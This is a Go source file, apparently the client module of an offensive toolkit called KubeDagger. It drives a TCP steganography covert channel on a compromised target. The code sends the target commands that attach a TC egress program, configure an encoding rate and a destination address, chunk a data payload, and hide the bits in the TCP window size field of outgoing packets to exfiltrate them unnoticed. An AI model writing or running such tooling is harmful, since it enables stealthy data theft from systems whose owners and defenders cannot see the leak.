package tcp_stego

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type StegoResult struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, data, dest, bitsPerPacket, output string) error {
	result := &StegoResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_tc_egress",
			"attach TC egress program to encode data in TCP window size field",
			"tcp_stego_attach_tc",
		},
		{
			"configure_encoding",
			"set bits-per-packet encoding rate for covert channel bandwidth",
			"tcp_stego_set_bpp",
		},
		{
			"set_destination",
			"configure destination IP:port for steganographic data transmission",
			"tcp_stego_set_dest",
		},
		{
			"encode_payload",
			"split payload into N-bit chunks and queue for window size encoding",
			"tcp_stego_encode",
		},
		{
			"start_transmission",
			"begin embedding encoded bits in TCP window size of outgoing packets",
			"tcp_stego_transmit",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + data + "#" + dest + "#" + bitsPerPacket
		status := shared.SendCommand(target, "/tcp_stego", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	d, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, d, 0644)
	}
	fmt.Println(string(d))
	return nil
}
